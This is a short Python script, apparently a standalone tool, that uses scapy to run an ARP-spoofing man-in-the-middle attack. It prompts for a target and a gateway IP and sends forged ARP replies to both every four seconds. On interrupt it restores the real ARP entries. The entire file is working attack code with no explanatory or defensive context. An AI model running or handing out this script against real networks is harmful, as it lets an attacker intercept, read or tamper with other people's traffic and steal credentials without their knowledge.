from scapy.all import *
import time

interval = 4
ip_target = input("Target:")
ip_gateway = input("Gateway:")
def spoof(target_ip, spoof_ip):
    targetmac = getmacbyip(target_ip)
    arp_response =ARP(pdst=target_ip, hwdst= targetmac , psrc=spoof_ip, op='is-at')
    # packet = scapy.ARP(pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip,op ='is-at')
    send(arp_response, verbose = False)
   
def restore(destination_ip, source_ip):
    destination_mac = getmacbyip(destination_ip)
    source_mac = getmacbyip(source_ip)
    packet =ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    send(packet, verbose = False)
    
try:
    while True:
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
except KeyboardInterrupt:
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)